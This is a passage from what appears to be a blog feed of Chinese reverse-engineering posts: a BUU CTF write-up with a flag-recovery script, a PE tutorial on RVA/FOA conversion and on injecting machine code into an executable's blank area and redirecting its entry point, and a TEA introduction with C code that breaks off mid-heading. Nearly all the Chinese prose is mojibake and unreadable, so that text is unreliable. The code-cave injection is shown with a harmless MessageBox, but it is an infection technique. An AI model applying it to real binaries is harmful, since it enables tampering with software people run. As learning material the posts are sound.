        <content type="html"><![CDATA[<h1 id="ã€å¯¹çº¿ç¨‹çš„åˆè®¤è¯†å’Œåˆæ­¥ç†è§£ä¸å¹³è¡¡å †æ ˆã€‘Youngter-drive"><a href="#ã€å¯¹çº¿ç¨‹çš„åˆè®¤è¯†å’Œåˆæ­¥ç†è§£ä¸å¹³è¡¡å †æ ˆã€‘Youngter-drive" class="headerlink" title="ã€å¯¹çº¿ç¨‹çš„åˆè®¤è¯†å’Œåˆæ­¥ç†è§£ä¸å¹³è¡¡å †æ ˆã€‘Youngter-drive"></a>ã€å¯¹çº¿ç¨‹çš„åˆè®¤è¯†å’Œåˆæ­¥ç†è§£ä¸å¹³è¡¡å †æ ˆã€‘Youngter-drive</h1><p>æŸ¥å£³æœ‰å£³è„±å£³ida</p><p>è¿›å…¥åˆ°å‡½æ•°main_0</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/youngter-drive01.png" alt="youngter-drive01"></p><p>ç¬¬ä¸€ä¸ªå‡½æ•°å·²ç»è¢«æˆ‘æ”¹è¿‡åç§°ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªè¾“å…¥å‡½æ•°</p><hr><p><strong>CreateMutexW</strong>æ˜¯ä¸€ä¸ªWindows APIå‡½æ•°ï¼Œç”¨äº<strong>åˆ›å»ºå‘½åæˆ–æœªå‘½åçš„äº’æ–¥ä½“</strong>ï¼ˆMutexï¼‰å¯¹è±¡ã€‚<strong>äº’æ–¥ä½“</strong>æ˜¯ä¸€ç§åŒæ­¥å¯¹è±¡ï¼Œ<strong>å…è®¸å¤šä¸ªçº¿ç¨‹&#x3D;&#x3D;åŒæ­¥&#x3D;&#x3D;è®¿é—®å…±äº«èµ„æº</strong>ï¼Œç¡®ä¿<strong>ä¸€æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹</strong>å¯ä»¥<strong>è®¿é—®è¯¥èµ„æº</strong>ã€‚</p><p><strong>CreateThread</strong>æ˜¯ä¸€ä¸ª Windows API å‡½æ•°ï¼Œç”¨äº<strong>åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹</strong>ã€‚å®ƒå…è®¸ä½ <strong>åœ¨&#x3D;&#x3D;ä¸€ä¸ªè¿›ç¨‹ä¸­å¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹&#x3D;&#x3D;<strong>ï¼Œ</strong>æ¯ä¸ªçº¿ç¨‹å¯ä»¥&#x3D;&#x3D;ç‹¬ç«‹&#x3D;&#x3D;è¿è¡Œä¸åŒçš„ä»£ç </strong>ã€‚</p><p><strong>CloseHandle</strong>æ˜¯ä¸€ä¸ª Windows API å‡½æ•°ï¼Œ<strong>ç”¨äºå…³é—­ä¸€ä¸ªå†…æ ¸å¯¹è±¡çš„å¥æŸ„ã€‚</strong></p><hr><p>è·Ÿè¿›<strong>StartAddress</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/startaddress.png" alt="startaddress"></p><p>è¿™é‡Œæ‰§è¡Œå®Œencpå‡½æ•°ä¼šæš‚åœ100ç§’</p><p>è·Ÿè¿›<strong>sub_9E119F</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/sub_9E119F.png" alt="sub_9E119F"></p><hr><p>å½“<strong>StartAddress</strong>è¿è¡Œå®Œæš‚åœåè¿è¡Œ<strong>sub_9E119F</strong></p><p><strong>sub_9E119F</strong>å®ƒåªæœ‰ä¸€ä¸ªå‡å‡çš„åŠŸèƒ½ï¼Œç„¶åæš‚åœç»™100s</p><p><strong>sub_9E119F</strong>æš‚åœæ—¶ï¼Œæ­¤åˆ»<strong>StartAddress</strong>å¼€å§‹è¿›è¡Œæ“ä½œ</p><h2 id="å³ä¸ºå½“TABLEæ˜¯å¥‡æ•°æ—¶è¿è¡ŒåŠ å¯†ï¼›å½“TABLEæ—¶å¶æ•°æ—¶ä¸è¿›è¡ŒåŠ å¯†ä¿ç•™åŸæ¥çŠ¶æ€"><a href="#å³ä¸ºå½“TABLEæ˜¯å¥‡æ•°æ—¶è¿è¡ŒåŠ å¯†ï¼›å½“TABLEæ—¶å¶æ•°æ—¶ä¸è¿›è¡ŒåŠ å¯†ä¿ç•™åŸæ¥çŠ¶æ€" class="headerlink" title="å³ä¸ºå½“TABLEæ˜¯å¥‡æ•°æ—¶è¿è¡ŒåŠ å¯†ï¼›å½“TABLEæ—¶å¶æ•°æ—¶ä¸è¿›è¡ŒåŠ å¯†ä¿ç•™åŸæ¥çŠ¶æ€"></a>å³ä¸ºå½“<strong>TABLEæ˜¯å¥‡æ•°</strong>æ—¶è¿è¡ŒåŠ å¯†ï¼›å½“<strong>TABLEæ—¶å¶æ•°</strong>æ—¶<strong>ä¸è¿›è¡ŒåŠ å¯†</strong>ä¿ç•™åŸæ¥çŠ¶æ€</h2><p>è¿›å…¥<strong>encp</strong>ï¼ˆå·²ç»æ”¹è¿‡åç§°ï¼‰</p><p>è¿™é‡Œéœ€è¦å¹³è¡¡å †æ ˆæ¶ˆå»çº¢åï¼ŒæŒ‰ç…§è¿™ä¸ªè§†é¢‘åšï¼š<a href="https://www.bilibili.com/video/BV1V84y1j7rS/?spm_id_from=333.880.my_history.page.click&vd_source=1c1b392be21faf2076e99a04a9cb6b82">https://www.bilibili.com/video/BV1V84y1j7rS/?spm_id_from=333.880.my_history.page.click&amp;vd_source=1c1b392be21faf2076e99a04a9cb6b82</a></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/youngter-drive/encp.png" alt="encp"></p><p>è¿™å°±æ˜¯åŠ å¯†ï¼Œå¤§å°å­—ç¬¦è½¬æ¢å’Œåœ¨é¢„å®šçš„å­—ç¬¦ä¸²å¯»å€</p><p>ç»“åˆä¸Šé¢çš„çº¿ç¨‹æ“ä½œå¯å¾—å‡ºè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;TOiZiZtOrYaToUwPnToBsOaOapsyS&#x27;</span></span><br><span class="line">flag = <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += enc[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> enc[i].isupper():</span><br><span class="line">            flag += <span class="built_in">chr</span>(txt.find(enc[i]) + <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(txt.find(enc[i]) + <span class="number">38</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šå°‘ä¸€ä¸ªå­—èŠ‚ï¼Œå› ä¸ºTABLEæ˜¯29ï¼Œåœ¨å¾ªç¯çš„æ—¶å€™æ˜¯å¤„ç†äº†30ä¸ªå­—ç¬¦</p><p>è€Œå¯†æ–‡åªæœ‰29ä½æ‰€ä»¥è¦çŒœ</p><p>æœ€åçŒœçš„å‡ºçš„æ˜¯è¦åœ¨è„šæœ¬å¾—å‡ºçš„flagååŠ ä¸Šä¸ªE</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€PEã€‘RVAä¸FOAçš„è½¬æ¢ å’Œ ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç </title>
      <link href="/2024/07/12/RVA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E6%8D%A2%20%E5%92%8C%20%E7%A9%BA%E7%99%BD%E5%8C%BA%E5%9F%9F%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/07/12/RVA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E6%8D%A2%20%E5%92%8C%20%E7%A9%BA%E7%99%BD%E5%8C%BA%E5%9F%9F%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="RVAä¸FOAçš„è½¬æ¢-å’Œ-ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "><a href="#RVAä¸FOAçš„è½¬æ¢-å’Œ-ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç " class="headerlink" title="RVAä¸FOAçš„è½¬æ¢ å’Œ ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "></a>RVAä¸FOAçš„è½¬æ¢ å’Œ ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç </h1><h2 id="RVAä¸FOAçš„è½¬æ¢"><a href="#RVAä¸FOAçš„è½¬æ¢" class="headerlink" title="RVAä¸FOAçš„è½¬æ¢"></a>RVAä¸FOAçš„è½¬æ¢</h2><p>RVAï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ï¼šå†…å­˜åœ°å€ - Imagebase</p><p>FOAï¼ˆæ–‡ä»¶åç§»åœ°å€ï¼‰ï¼š</p><p>â€‹1ã€åˆ¤æ–­RVAæ˜¯å¦åœ¨å¤´éƒ¨</p><p>â€‹ï¼ˆ1ï¼‰å¦‚æœåœ¨å¤´éƒ¨ï¼šFOV &#x3D; RVA</p><p>â€‹2ã€åˆ¤æ–­RVAä½äºå“ªä¸ªèŠ‚ï¼š</p><p>â€‹RVA &gt;&#x3D;èŠ‚.VirtualAddress</p><p>â€‹RVA&lt;&#x3D;èŠ‚.VirtualAddress + å½“å‰èŠ‚<strong>å†…å­˜å¯¹é½åçš„å¤§å°</strong></p><p>â€‹å·®å€¼ &#x3D; RVA - èŠ‚.VirtualAddress</p><p>â€‹3ã€FOA &#x3D;èŠ‚ .PointerToRawData + å·®å€¼</p><h2 id="ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "><a href="#ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç " class="headerlink" title="ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "></a>ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç </h2><p>å¤–é“¾å¸®åŠ©ï¼š<br>ã€PEæ–‡ä»¶å…¥é—¨ï¼Œä¸€ç¯‡å°±å¤Ÿäº†ã€‘<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11</a></p><p>æˆ‘ä»¬è¦æ’å…¥è¿™æ ·ä¸€ä¸ªä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_4VT9QNAKK83KRDC.webp" alt="img"></p><p>åŠŸèƒ½å‘¢å°±æ˜¯å¼¹å‡ºä¸€ä¸ªè¿™æ ·çš„é”™è¯¯çª—å£ã€‚è¿™ä¸ªç¨‹åºçš„æ ¸å¿ƒå°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ªmessageboxå‡½æ•°å¼¹å‡ºäº†ä¸€ä¸ªçª—å£ã€‚ç”±äºæˆ‘ä»¬æ˜¯è¦å¯¹peæ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥è‚¯å®šä¸æ˜¯å°†ä»£ç å†™å…¥ï¼Œè€Œæ˜¯è¦å°†æœºå™¨ç æ’å…¥ã€‚å°±æ˜¯åˆ©äºæ ˆä¼ ç¬¬å››ä¸ªå‚æ•°0ï¼Œç„¶åcallã€‚ <img src="https://bbs.kanxue.com/upload/attach/202405/984774_KT75GA72HJ2S6H9.webp" alt="img"></p><ol><li><p>æ„é€ è¦å†™å…¥çš„ä»£ç  6A 00 6A 00 6A 00 6A 00 E8ï¼ˆcallï¼‰xx xxï¼Œæˆ‘ä»¬çœ‹åˆ°çš„FFæ˜¯(near jump)è¦ä½¿ç”¨ä¸€ä¸ªä»€ä¹ˆå¯¼å…¥è¡¨ï¼ˆåé¢ä¼šå­¦ï¼‰ï¼Œè€Œæˆ‘ä»¬æ’å…¥çš„æ—¶å€™E8åˆ©ç”¨ç›¸å¯¹åç§»é‡è°ƒç”¨å‡½æ•°ã€‚E8åé¢è·Ÿå››ä¸ªå­—èŠ‚çš„ç›¸å¯¹åç§»é‡offsetï¼Œæ€ä¹ˆè®¡ç®—ï¼Ÿè¿˜å¥½äº†è§£è¿‡æ±‡ç¼–ï¼Œoffset&#x3D;è¦è·³è½¬çš„åœ°æ–¹çš„åœ°å€-callæŒ‡ä»¤ä¸‹é¢ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ <img src="https://bbs.kanxue.com/upload/attach/202405/984774_CXY5HK8P5TZBG2P.webp" alt="img"></p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_SBJX8WRWC3RF2WS.webp" alt="img"></p><p>å°†å›¾ä¸€æ ‡è®°ä½ç½®æ”¹ä¸ºcall 1c1023 å¾—åˆ°å›¾äºŒï¼Œåé¢çš„0A&#x3D;1c1023-1c1019.æˆ‘ä»¬çš„ç›®æ ‡æŒ‡ç¤ºè®©ä»–å¼¹å‡ºçª—å£ï¼Œä¸èƒ½ç ´åç¨‹åºè¿è¡Œï¼Œæ‰€ä»¥å¼¹å‡ºä¹‹åæˆ‘ä»¬è¿˜è¦è·³å›åˆ°åˆå§‹ä½ç½®ï¼Œè®©ç¨‹åºæ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨JMPï¼ˆE9ï¼‰æŒ‡ä»¤æ¥å®ç°è¯¥æ“ä½œï¼ŒE9åé¢ä¹Ÿæ˜¯è·Ÿåç§»é‡ï¼Œç”¨æ³•ä¸E8ç›¸åŒã€‚æ‰¾åˆ°messageboxçš„åœ°å€75858A70ã€‚æ ¹æ®callæŒ‡ä»¤çš„ä½ç½®æ¥è®¡ç®—ã€‚ <img src="https://bbs.kanxue.com/upload/attach/202405/984774_SN5DERUWVXB5EHM.webp" alt="img"></p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_2WSAU8BCZBMW85C.webp" alt="img"></p><p>E8æ‰€åœ¨çš„ä½ç½®æ˜¯3A8ï¼Œè¿™æ˜¯æ–‡ä»¶ä¸­çš„ä½ç½®ï¼Œæˆ‘ä»¬è¦è€ƒè™‘çš„æ˜¯è¿è¡Œæ—¶çš„ä½ç½®ï¼Œæ‰€ä»¥è¦æŠŠè¿™ä¸ªåœ°å€åŠ ä¸ŠImage Base &#x3D;01000000,æ‰€ä»¥æœ€åå¾—åˆ°çš„ offset&#x3D;75858A70-010003A8-5&#x3D;7485 86C3.æœ€åè·³è½¬åˆ°ç¨‹åºçš„å…¥å£å¤„ï¼ŒæŸ¥çœ‹å¯é€‰å¤´çš„æˆå‘˜å…¥å£å€¼ä¸º739DåŠ ä¸ŠImage Baseå¾—åˆ°0100739D. offset&#x3D;0100739D-010003AD-5&#x3D;6FEB <img src="https://bbs.kanxue.com/upload/attach/202405/984774_JTHAXGTNETD5DTR.webp" alt="img"></p></li><li><p>å°†ç¨‹åºå…¥å£ç‚¹æŒ‡å‘æˆ‘ä»¬æ’å…¥çš„ä»£ç ï¼Œ</p><p>ä¹Ÿå°±æ˜¯ä¿®æ”¹æ‰©å±•peå¤´é‡Œçš„å…¥å£å€¼</p><p><img src="https://bbs.kanxue.com/upload/attach/202405/984774_HWVWN8AGXW9PECU.webp" alt="img"></p></li></ol><p>åœ¨108å¤„å 4ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ’å…¥çš„ç¨‹åºèµ·å§‹ä½ç½®æ˜¯000003A0.ç„¶åï¼Œç„¶åå°±æ²¡ç„¶åäº†ï¼Œç¨‹åºè¿è¡Œä¸èµ·ï¼Œidaå’Œodçœ‹åˆ°çš„ä¸œè¥¿éƒ½å¾ˆå¥‡æ€ªï¼Œå»¶è¯¯äº†ä¸¤å¤©ï¼Œè¿™é‡Œæˆ‘ç›´æ¥è¯´ä¸€ä¸‹è¸©çš„å‘ï¼Œæˆ‘éšæ„æ‰¾äº†ä¸€ä¸ªç©ºç™½å¤„å¡«å……æœºå™¨ç ï¼Œä½†åæ¥å‘ç°ä¸æ˜¯æ‰€æœ‰çš„ä½ç½®éƒ½èƒ½å‘ç”Ÿè·³è½¬ï¼Œç„¶åå°±å°†æŒ‡ä»¤æ’å…¥åœ¨äº†textæ®µçš„æœ«å°¾ï¼Œç„¶åå‘ç°è·³è½¬çš„æœ‰äº›å·®å¼‚ï¼Œä¸ä¼šè·³è½¬åœ¨æˆ‘è®¾ç½®çš„åœ°æ–¹ï¼ŒåçŸ¥åè§‰çš„å‘ç°ï¼Œè§†é¢‘é‡Œçš„è€å“¥æ¼”ç¤ºçš„çš„æ—¶å€™æ‹¿çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½ç›¸åŒå¤§å°çš„ç¨‹åºï¼Œæˆ‘ç”¨çš„ç¨‹åºæ˜¯ä¸€ä¸ªä¸åŒçš„ï¼Œæ‰€ä»¥å°±è¦è®¡ç®—ä¸€ä¸‹ ç”¨æˆ‘ä»¬å‰é¢å­¦ä¹ åˆ°çš„çŸ¥è¯†ã€‚ä¸‹é¢ç†ä¸€ä¸‹æ­¥éª¤</p><ol><li>é¦–å…ˆåœ¨æ–‡ä»¶ä¸­ç¡®å®šä¸€æ®µç©ºé—´ï¼Œç„¶åè¿è¡Œç¨‹åºçš„æ—¶å€™æŸ¥çœ‹ æ˜¯å¦ä¸ºç©º</li><li>æ’å…¥ï¼Œæ ¹æ®å†…å­˜ä¸­çš„ä½ç½®è®¡ç®—</li><li>æ”¹å…¥å£ï¼Œå†…å­˜ä¸­ä»£ç çš„èµ·å§‹ä½ç½® <img src="https://bbs.kanxue.com/upload/attach/202405/984774_F2XDXYHGUTVBS3R.webp" alt="img"></li></ol><p>ç¬¬ä¸€æ¬¡å°è¯•çš„æ—¶å€™æˆåŠŸå¼¹å‡ºäº†çª—å£ï¼Œä½†æ˜¯å…³é—­ä¹‹åæ²¡æœ‰å‡ºç°è®°äº‹æœ¬ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥åˆ¤æ–­æ‰§è¡Œå®Œæˆ‘ä»¬çš„ä»£ç åï¼Œæ²¡æœ‰æˆåŠŸçš„è¿”å›åŸå…¥å£ã€‚æ­¤æ—¶æ‰æƒ³èµ·æ¥è¡¥ç å†™é”™äº†ï¼Œæ’å…¥çš„ä½ç½®æ˜¯87b0ï¼Œå…¥å£ç‚¹æ˜¯739dï¼Œ739d-83b0-5&#x3D; <img src="https://bbs.kanxue.com/upload/attach/202405/984774_D7HRYQ8HEYMY6CM.webp" alt="img"></p><p>ç„¶åæˆ‘å°±åœ¨e9åé¢å¡«å……äº†E8 EF 00 00,æ„è¯†åˆ°è¿”å›å‡ºç°é—®é¢˜åï¼Œæƒ³åˆ°äº†æœ‰ç¬¦å·æ•°çš„ç¬¦å·æ‰©å±•ï¼Œåº”è¯¥æ‰©å±•å…¶ç¬¦å·ä½å³1ï¼Œæ‰€ä»¥æ­£ç¡®çš„è¡¥ç å½¢å¼æ˜¯FF FF EF E8,å¡«å……è¿›å»å°±æ˜¯E8 EF FF FF.</p><p>å¤–é“¾å¸®åŠ©ï¼š<br>ã€PEæ–‡ä»¶å…¥é—¨ï¼Œä¸€ç¯‡å°±å¤Ÿäº†ã€‘<a href="https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11">https://bbs.kanxue.com/thread-281836.htm#msg_header_h3_11</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TEAï¼ŒXTEAä¸XXTEAåŠå…¶ä¾‹é¢˜</title>
      <link href="/2024/07/12/TEA%EF%BC%8CXTEA%E4%B8%8EXXTEA%E5%8F%8A%E5%85%B6%E4%BE%8B%E9%A2%98/"/>
      <url>/2024/07/12/TEA%EF%BC%8CXTEA%E4%B8%8EXXTEA%E5%8F%8A%E5%85%B6%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="TEAï¼ŒXTEA-ä¸-XXTEA-åŠå…¶ä¾‹é¢˜"><a href="#TEAï¼ŒXTEA-ä¸-XXTEA-åŠå…¶ä¾‹é¢˜" class="headerlink" title="TEAï¼ŒXTEA ä¸ XXTEA åŠå…¶ä¾‹é¢˜"></a>TEAï¼ŒXTEA ä¸ XXTEA åŠå…¶ä¾‹é¢˜</h1><p>ä¸ä»‹ç»èƒŒæ™¯äº†ï¼Œç›´æ¥ä¸Šç®—æ³•</p><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p>TEA ç®—æ³•æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå…¨ç§°ä¸º Tiny Encryption Algorithmã€‚å®ƒä½¿ç”¨ä¸€ä¸ª 128 ä½çš„å¯†é’¥å’Œ 64 ä½çš„æ˜æ–‡å—ï¼Œé€šè¿‡å¤šè½®è¿­ä»£åŠ å¯†æ¥å®ç°åŠ å¯†è¿‡ç¨‹ã€‚TEA ç®—æ³•çš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯å¯†é’¥çš„ä½¿ç”¨é¡ºåºä¸åŒã€‚å…¶æ‹¥æœ‰ä¸€ä¸ªå«åš Feistel ç»“æ„çš„å¯†ç å­¦ç»“æ„ã€‚è¿™ç§å¯†ç å­¦ç»“æ„é€šä¿—çš„æ¥è®²å°±æ˜¯ä¼šå°†åŠ å¯†çš„ plaintext åˆ†æˆ Lã€R ä¸¤éƒ¨åˆ†ï¼Œå¹¶ä¸”æ»¡è¶³ L*{i+1} &#x3D; R_i, R*{i+1} &#x3D; F(K_i,R_i) \oplus L_i è¿™ç§äº¤æ¢å¼çš„åŠ å¯†æ–¹å¼çš„ä¸€ç§ç»“æ„ã€‚tea ç®—æ³•æœ€å…³é”®çš„æ˜¯è¦æ‰¾åˆ° DELTA å€¼å’Œ 128 ä½çš„ keyã€‚å…¶ä¸­ DELTA å¸¸å¸¸æ˜¯å­˜åœ¨ 0x9e3779b9ï¼Œä½†æ˜¯ä¹Ÿå­˜åœ¨ DELTA çš„å€¼è¢«æ”¹å˜çš„ä»£ç ã€‚é™¤äº†åˆç­‰ tea ç®—æ³•ï¼Œtea ç®—æ³•è¿˜æœ‰å¾ˆå¤šé­”æ”¹ç‰ˆæœ¬ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/24summer/tea/tea.png" alt="tea"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åŠ å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;     <span class="comment">//v0,v1åˆ†åˆ«ä¸ºå­—ç¬¦ä¸²çš„ä½å­—èŠ‚é«˜å­—èŠ‚</span></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;               <span class="comment">//åŠ å¯†32è½®</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;<span class="comment">//åŠ å¯†åå†é‡æ–°èµ‹å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                        <span class="comment">//è§£å¯†æ—¶å°†åŠ å¯†ç®—æ³•çš„é¡ºåºå€’è¿‡æ¥ï¼Œè¿˜æœ‰+=å˜ä¸º-=</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;<span class="comment">//è§£å¯†åå†é‡æ–°èµ‹å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span></span><br><span class="line">    <span class="comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">encrypt</span>(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">decrypt</span>(v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xTEA"><a href="#xTEA" class="headerlink" 